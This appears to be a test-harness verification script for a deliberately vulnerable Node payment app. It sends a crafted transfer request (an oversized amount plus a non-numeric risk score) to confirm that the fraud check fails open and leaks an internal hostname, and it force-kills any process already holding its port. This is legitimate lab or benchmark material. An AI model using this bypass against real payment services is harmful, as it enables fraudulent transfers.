#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"; PORT="${PORT:-8102}"; export PORT
pick_free_port() {
  local p="$1"
  if command -v lsof >/dev/null 2>&1; then local pid; pid=$(lsof -nP -tiTCP:"$p" -sTCP:LISTEN 2>/dev/null || true); [ -n "$pid" ] && kill -9 $pid 2>/dev/null || true; fi
  for _ in 1 2 3; do
    if (exec 3<>"/dev/tcp/127.0.0.1/$p") 2>/dev/null; then exec 3>&- 3<&-; p=$(( (RANDOM % 2000) + 8500 )); else echo "$p"; return; fi
  done
  echo "$p"
}
PORT=$(pick_free_port "$PORT"); export PORT
[ -d node_modules ] || npm install --no-audit --no-fund >/dev/null 2>&1
node app.js > .verify.log 2>&1 & PID=$!
trap 'kill $PID 2>/dev/null || true' EXIT
for i in $(seq 1 80); do curl -s -o /dev/null -X POST "http://127.0.0.1:$PORT/transfer" --data "from=x&to=y&amount=1" && break || sleep 0.5; done
URL="http://127.0.0.1:$PORT/transfer"
# Ataque: monto 50000 (normalmente denegado) + riskScore no numerico => el chequeo lanza
RESP=$(curl -s -X POST "$URL" --data-urlencode "from=alice" --data-urlencode "to=mallory" --data-urlencode "amount=50000" --data-urlencode "riskScore=abc")
echo "respuesta: $RESP"
OK=0
echo "$RESP" | grep -Eq '"executed": ?true' && OK=1
LEAK=0
echo "$RESP" | grep -q 'fraud-svc.internal' && LEAK=1
if [ $OK = 1 ] && [ $LEAK = 1 ]; then
  echo "VERIFY PASS: fail-open confirmado (transferencia ejecutada con el chequeo roto) y detalle interno filtrado"; exit 0
else
  echo "VERIFY FAIL: no se observo fail-open con filtrado de detalle"; exit 1
fi
